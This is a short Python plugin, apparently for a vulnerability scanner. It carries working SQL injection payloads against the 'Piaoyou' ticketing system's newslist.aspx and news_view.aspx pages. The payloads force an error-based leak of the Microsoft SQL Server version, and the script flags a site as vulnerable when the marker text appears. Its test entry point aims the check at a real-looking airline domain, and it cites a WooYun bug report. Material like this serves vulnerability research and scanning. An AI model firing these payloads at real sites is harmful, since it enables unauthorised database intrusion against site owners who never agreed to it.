#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name:票友票务系统通用sql注入(补漏)
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0128207
#Author:404

def assign(service,arg):
    if service=="piaoyou":
        return True,arg 


def  audit(arg):
    ps=[
        'newslist.aspx?newsid=1or/**/1=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version))--',
        'news_view.aspx?id=1or/**/1=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version))--',
        ]
    for p in ps:
        url=arg+p
        code,head,res,errcode,_=curl.curl2(url)
        if code==500 and "GAOJIMicrosoft" in res:
            security_hole(url)
        
        
if __name__=="__main__":
    from dummy import *
    audit(assign('piaoyou','http://www.bl-air.com/')[1])